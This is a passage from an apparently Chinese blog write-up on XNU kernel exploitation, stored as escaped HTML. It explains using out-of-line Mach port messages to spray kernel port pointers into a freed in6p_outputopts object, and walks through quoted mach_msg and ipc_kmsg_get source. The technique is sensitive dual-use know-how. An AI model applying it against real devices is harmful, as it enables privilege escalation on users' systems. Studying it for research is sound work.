		  &lt;span class=&quot;nl&quot;&gt;ip_impdonation:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* port supports importance donation */&lt;/span&gt;
		  &lt;span class=&quot;nl&quot;&gt;ip_tempowner:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* dont give donations to current receiver */&lt;/span&gt;
		  &lt;span class=&quot;nl&quot;&gt;ip_guarded:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;         &lt;span class=&quot;cm&quot;&gt;/* port guarded (use context value as guard) */&lt;/span&gt;
		  &lt;span class=&quot;nl&quot;&gt;ip_strict_guard:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Strict guarding; Prevents user manipulation of context values directly */&lt;/span&gt;
		  &lt;span class=&quot;nl&quot;&gt;ip_specialreply:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* port is a special reply port */&lt;/span&gt;
		  &lt;span class=&quot;nl&quot;&gt;ip_sync_link_state:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* link the special reply port to destination port/ Workloop */&lt;/span&gt;
		  &lt;span class=&quot;nl&quot;&gt;ip_impcount:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* number of importance donations in nested queue */&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;mach_port_mscount_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_mscount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_port_rights_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_srights&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_port_rights_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_sorights&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#if	MACH_ASSERT
#define	IP_NSPARES		4
#define	IP_CALLSTACK_MAX	16
&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*	queue_chain_t	ip_port_links;*//* all allocated ports */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;thread_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip_thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* who made me?  thread context */&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip_timetrack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* give an idea of &quot;when&quot; created */&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;uintptr_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip_callstack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_CALLSTACK_MAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* stack trace */&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip_spares&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_NSPARES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* for debugging */&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif	&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* MACH_ASSERT */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#if DEVELOPMENT || DEBUG
&lt;/span&gt;	&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;ip_srp_lost_link&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* special reply port turnstile link chain broken */&lt;/span&gt;
			&lt;span class=&quot;nl&quot;&gt;ip_srp_msg_sent:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* special reply port msg sent */&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那怎么把它的内核态地址分配到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inp-&amp;gt;in6p_outputopts&lt;/code&gt;呢？&lt;/p&gt;

&lt;p&gt;答案是：使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OOL Message&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OOL Message&lt;/code&gt;定义如下，结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_ool_ports_descriptor_t&lt;/code&gt;用于在一条消息里以Port数组的形式发送多个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mach Port&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_msg&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_body_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_ool_ports_descriptor_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;为什么要使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OOL Message&lt;/code&gt;作为填充对象，我们可以从源码中找到答案&lt;/p&gt;

&lt;p&gt;Mach Message的接收与发送依赖函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg()&lt;/code&gt;进行，这个函数在用户态与内核态均有实现&lt;/p&gt;

&lt;p&gt;我们跟入函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg()&lt;/code&gt;，函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg()&lt;/code&gt;会调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_trap()&lt;/code&gt;，函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_trap()&lt;/code&gt;会调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_overwrite_trap()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;mach_msg_trap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_overwrite_trap_args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rcv_msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_overwrite_trap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;当函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg()&lt;/code&gt;第二个参数是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MACH_SEND_MSG&lt;/code&gt;的时候，函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_get()&lt;/code&gt;用于分配缓冲区并从用户态拷贝数据到内核态&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;mach_msg_overwrite_trap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_overwrite_trap_args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;msg_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_option_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// mach_msg()第二个参数&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 大吉大利&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;vm_map_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* Only accept options allowed by the user */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_OPTION_USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_SEND_MSG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ipc_space_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;space&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ipc_kmsg_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 创建kmsg变量&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// 分配缓冲区并从用户态拷贝消息头到内核态&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	    &lt;span class=&quot;c1&quot;&gt;// 转换端口，并拷贝消息体&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_copyin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;// 发送消息&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg_timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_RCV_MSG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_get()&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_t&lt;/code&gt;就是内核态的消息存储结构体，拷贝过程看注释，这里基本是在处理&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kmsg-&amp;gt;ikm_header&lt;/code&gt;，也就是用户态传入的消息数据&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;ipc_kmsg_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;msg_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_kmsg_t&lt;/span&gt;              &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsgp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;msg_and_trailer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_kmsg_t&lt;/span&gt;                      &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_max_trailer_t&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_legacy_base_t&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;legacy_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;len_copied&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;legacy_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_descriptor_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;// 长度参数检查&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// mach_msg_legacy_base_t结构体长度等于mach_msg_base_t&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_legacy_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;len_copied&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_legacy_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;len_copied&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_legacy_base_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	
	&lt;span class=&quot;c1&quot;&gt;// 从用户态拷贝消息到内核态&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;copyinmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;legacy_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len_copied&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_SEND_INVALID_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 获取内核态消息变量起始地址&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;msg_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;legacy_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 直接加上最长的trailer长度，不知道接收者会定义何种类型的trailer，此处是做备用操作&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// typedef mach_msg_mac_trailer_t mach_msg_max_trailer_t;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// #define MAX_TRAILER_SIZE ((mach_msg_size_t)sizeof(mach_msg_max_trailer_t))&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;msg_and_trailer_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX_TRAILER_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	
	&lt;span class=&quot;c1&quot;&gt;// 分配内核空间&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg_and_trailer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 初始化kmsg.ikm_header部分字段&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 拷贝消息体，此处不包括trailer&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;copyinmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt;&lt;span 